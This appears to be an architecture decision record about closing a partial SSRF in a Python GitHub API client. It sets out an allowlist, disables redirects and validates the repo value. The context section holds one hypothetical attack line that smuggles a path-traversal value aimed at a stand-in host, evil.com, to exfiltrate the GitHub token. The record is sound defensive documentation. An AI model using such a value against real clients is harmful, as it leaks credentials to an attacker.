# ADR-028: Transport Boundary for GitHubClient (SSRF Mitigation)

**Status:** ACCEPTED
**Issue:** #57, Code Scanning alert #2 (`py/partial-ssrf`)
**Date:** 2026-10-03
**Deciders:** dev-backend

## Context

`GitHubClient` accepts an arbitrary `base_url` constructor parameter and passes it
directly to `httpx.AsyncClient`. The `repo` value (from `GITHUB_REPO` env var) is
interpolated into the request path without validation.

GitHub's API at `https://api.github.com` issues 301/302 redirects — for example, when
resolving a merged PR — which `httpx` follows by default. An attacker who controls the
`base_url` or `repo` could redirect the client to an arbitrary host:

```python
# Hypothetical attack via GITHUB_REPO
gh = GitHubClient(token="ghp_...", repo="../../@evil.com/redirect?")
# httpx follows redirect to https://evil.com/redirect?/repos/owner/repo/issues/...
```

This is a **partial SSRF** (Server-Side Request Forgery): the attacker cannot inject a
fully arbitrary URL into the request, but they can redirect the transport to an arbitrary
host, exfiltrating the GitHub token to an attacker-controlled endpoint.

### Exploitability analysis

The token is embedded in an `Authorization: Bearer` header. For the attack to succeed:

1. The attacker must control `base_url` or `repo` (e.g., via `GITHUB_REPO` env or config).
2. GitHub's API must return a redirect to an attacker-controlled host.
3. The `repo` path traversal vector requires GitHub to follow a relative redirect that
   httpx resolves against the `base_url` — unlikely in practice, but the risk is non-zero.

**Conclusion:** The vulnerability is exploitable under the assumption that an attacker can
set environment variables or config — a reasonable production threat model. The fix must
be fail-closed regardless of how `base_url` or `repo` are set.

## Decision

1. **Whitelist `base_url`** — only `https://api.github.com`, `https://github.com/api/v3`,
   and `http://127.0.0.1` (for local test fixtures) are permitted. Any other value raises
   `ValueError` at construction time.
2. **Disable redirect following** — `follow_redirects=False` prevents httpx from following
   any redirect, eliminating the redirect-to-arbitrary-host vector.
3. **Validate `repo` format** — must match `owner/repo` (alphanumeric, hyphens, underscores,
   dots). Rejects path-traversal attempts.
4. **Connection limits** — `Limits(max_keepalive_connections=1, max_connections=2)` prevents
   connection pooling abuse and keeps the transport scoped to a single logical channel.
5. **Request timeout** — `httpx.Timeout(10.0, connect=5.0)` bounds both overall and
   connection establishment time.
6. **`verify` parameter** — `httpx.AsyncClient(verify=...)` is exposed as a constructor
   argument (default `True`). Set to `False` only for local test fixtures with
   self-signed certificates.

## Consequences

- **Positive:** SSRF risk eliminated. CodeQL `py/partial-ssrf` alert resolves.
- **Negative:** Custom GitHub Enterprise URLs are blocked. If GitHub Enterprise support is
  needed, the allowlist must be explicitly extended (see below).
- **Neutral:** The `Limits` and `Timeout` settings are conservative; they can be relaxed
  if performance profiling shows they are a bottleneck.

## GitHub Enterprise Support

If GitHub Enterprise is required, add the enterprise URL to the allowlist in
`opsswarm/github_client.py:_ALLOWED_BASE_URLS`. Do not accept arbitrary URLs without
explicit addition to the allowlist.
